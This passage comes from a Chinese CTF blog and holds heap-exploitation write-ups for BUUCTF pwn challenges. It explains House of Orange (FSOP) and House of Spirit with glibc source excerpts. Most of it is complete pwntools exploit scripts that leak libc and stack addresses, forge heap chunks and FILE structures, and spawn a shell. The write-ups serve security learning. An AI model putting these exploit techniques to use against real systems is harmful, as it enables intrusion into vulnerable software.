class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;4.show\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>ptr = <span class="hljs-number">0x602118</span><br>key = <span class="hljs-number">0x00000000006022B8</span><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\x07&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>heap_addr = add(<span class="hljs-number">7</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>log,success(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;b&quot;</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;c&quot;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">7</span>):<br>	free(i)<br><span class="hljs-comment">#unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>)<br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">7</span>,fake_chunk)<br>free(<span class="hljs-number">8</span>)<br><br>payload = p64(heap_addr + <span class="hljs-number">0x190</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,p64(key))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x80</span>,p32(<span class="hljs-number">5</span>) + p32(<span class="hljs-number">5</span>))<br>show(<span class="hljs-number">6</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = p64(free_hook) * <span class="hljs-number">3</span> + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="二十、lctf2016-pwn200"><a href="#二十、lctf2016-pwn200" class="headerlink" title="二十、lctf2016_pwn200"></a>二十、lctf2016_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105020439.png"><span class="image-caption">image-20210905105020439</span></p>
<p>常规checksec一下，64位，保护几乎都没开启</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105059956.png"><span class="image-caption">image-20210905105059956</span></p>
<p>进入IDA，进入的第一个函数就存在问题，这边最长输入0x30的字符，但是v2距离rbp的距离也是0x30，所以可以借此打印出rbp的值，得到栈上地址，那么应该就是ret2shellcode了</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105342837.png"><span class="image-caption">image-20210905105342837</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105242460.png"><span class="image-caption">image-20210905105242460</span></p>
<p>再往下看，这边存在任意地址写</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110435529.png"><span class="image-caption">image-20210905110435529</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110553881.png"><span class="image-caption">image-20210905110553881</span></p>
<p>计算一下偏移</p>
<p>然后通过任意地址写往free@got表里写入前面算好的shellcode的地址，再执行到后面程序中的free函数，然后跳转到写好的shellcode执行</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905112409521.png"><span class="image-caption">image-20210905112409521</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25517</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn200&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *main&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;who are u?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br>p.send(shellcode.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>))<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">80</span><br>log.info(<span class="hljs-built_in">hex</span>(leak_addr))<br>p.recvuntil(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;give me money~\n&quot;</span>)<br>payload = p64(leak_addr) + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(free_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>house of系列</title>
    <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> 该系列内容较多，将会持续更新</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>爆破概率太低，不建议使用，了解一下利用思路即可</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>版本 glibc-2.24及以下。是FSOP的思想，在新版本FSOP的思想仍然重要，只是缺少了 unsorted bin attack 的配合，让 house of orange 停留在了2.24</p>
<p>先介绍一下一个重点知识：如果在分配堆块时， top chunk 不够分配，那么根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。所以可以通过把 top chunk size 改小这种方式让 top chunk 进入unsorted bin 中，从而产生 libc 地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.mmap_threshold)<br>        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<span class="hljs-comment">/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/</span><br>  &#123;<br>    <span class="hljs-keyword">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br>  try_mmap:<br>  <br>  .........<br>  ..........<br>    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                       multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                       enough space in old_top to do this.</span><br><span class="hljs-comment">                     */</span><br>                    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                    set_head (old_top, old_size | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                              (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                    <span class="hljs-comment">/* If possible, release the rest. */</span><br>                    <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                      &#123;<br>                        _int_free (av, old_top, <span class="hljs-number">1</span>);<span class="hljs-comment">/*将old top chunk free掉，加入unsorted bin*/</span><br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p>house of orange 利用过程：</p>
<p>修改一个 unsorted chunk 的size字段为0x60，利用 unsorted bin attack 将 _IO_list_all 修改为 main_arena+0x58，而IO_list_all 中的 *chain 指针位于 _IO_list_all + 0x68 的位置：即main_arena + 0x58 + 0x68 是 small bin中大小为0x60的位置，所以需要将 chunk 的size修改为0x60，让该 chunk 链入 small bin 的相应位置上，在其上布置好伪造的 _IO_FILE_plus，那么就形成了一个伪造的 chain 链。伪造这些后，只要再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</p>
<p>malloc_printerr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (chunksize_nomask (victim)<br>                                &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>触发 malloc_printerr 后，会形成下列调用链：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">mallloc_printerr-&gt; __libc_message—&gt;<span class="hljs-built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW<br>而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数<br></code></pre></td></tr></table></figure>

<p>_IO_flush_all_lockp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (<span class="hljs-keyword">int</span> do_lock)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_flockfile (fp);<br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span class="hljs-comment">/*一些检查，需要绕过*/</span><br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="hljs-comment">/*也可以绕过这个*/</span><br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br>        result = EOF;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以伪造的 _IO_FILE_plus 要通过下列检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><br>或者是<br><span class="hljs-number">2.</span><br>_IO_vtable_offset (fp) == <span class="hljs-number">0</span> <br>&amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> <br>&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br></code></pre></td></tr></table></figure>

<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>来自buu的题目，程序不存在 delete 函数，无法释放堆块，所以要用到前面的修改 top chunk size 的方法，从而得到 libc 地址。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313210805600.png"><span class="image-caption">image-20220313210805600</span></p>
<p>漏洞点在于 edit 函数，对于写入的个数没做严格的限制，可以写入大于申请堆块长度的内容，从而存在堆溢出。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313210907191.png"><span class="image-caption">image-20220313210907191</span></p>
<p>伪造 IO_FILE_plus 后的成果如下：</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313170817299.png"><span class="image-caption">image-20220313170817299</span></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313170916290.png"><span class="image-caption">image-20220313170916290</span></p>
<p>最终只能在本地getshell</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313173210640.png"><span class="image-caption">image-20220313173210640</span></p>
<p>远程一直都是显示 dumped core</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20220313173230192.png"><span class="image-caption">image-20220313173230192</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./house_of_orange&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26547</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xf81</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;aaaaaaaa&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5188</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>_IO_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] + libc_base<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>vtable_addr = heap_base + <span class="hljs-number">0x5e8</span><br>stream = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0x61</span>)<br>stream += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>stream = stream.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&quot;\x00&quot;</span>)<br>stream += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mode&lt;=0</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(vtable_addr)<br>stream += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>stream += p64(sys)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>payload += stream<br>edit(payload)<br><span class="hljs-comment">#p.sendlineafter(&quot;: &quot;,&#x27;1&#x27;)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>技术来源：<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p>
<p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png"><span class="image-caption">http://p7.qhimg.com/t01c4e1f8669a8b77bd.png</span></p>
<ul>
<li>（2）存在可将堆变量指针覆盖为指向可控区域，即上一步中的区域</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>（1）伪造堆块，在可控1及可控2（可控2的伪造size不能小于2*SIZE_SZ且不能大于已分配内存）构造好数据，将它伪造成一个fast chunk。</p>
<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
<p>（3）释放堆块，将伪造的堆块释放入fast bin里面。</p>
<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
<p>第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在16<del>64字节之间，64位是在32</del>128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面</p>
<h3 id="例题BUU-lctf2016pwn200"><a href="#例题BUU-lctf2016pwn200" class="headerlink" title="例题BUU-lctf2016pwn200"></a>例题BUU-lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png"><span class="image-caption">image-20210905204052044</span></p>
<p>常规checksec一下，保护基本没开。</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png"><span class="image-caption">image-20210905204120841</span></p>
<p>这里的输入存在漏洞，填满可以泄露出rsp上的值，获得栈上地址</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png"><span class="image-caption">http://p8.qhimg.com/t01eb7870c8fa4fde39.png</span></p>
<p>目标地址的构造为上图所示，在money中输入的是伪堆块的size，在id里输入的是下一个堆块的size，以此绕过free释放堆块时候系统的检查</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png"><span class="image-caption">image-20210905204549591</span></p>
<p>然后就是：</p>
<p>（1）覆盖堆指针，在输入money的时候，会覆盖堆块。</p>
<p>（2）调用free函数将伪堆块释放到fastbin中</p>
<p>（3）申请堆块，将刚刚的伪堆块申请出来</p>
<p>（4）输入数据，即可修改目标区域，eip，使其指向shellcode</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png"><span class="image-caption">image-20210905230703667</span></p>
<p>这是构造出来的fake_chunk，后面就是要把这块释放了，然后再申请回来，把0x400b34这个地址覆盖为shellcode，即可在退出程序时返回到shellcode去执行</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png"><span class="image-caption">image-20210905212358111</span></p>
<p>getshell！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

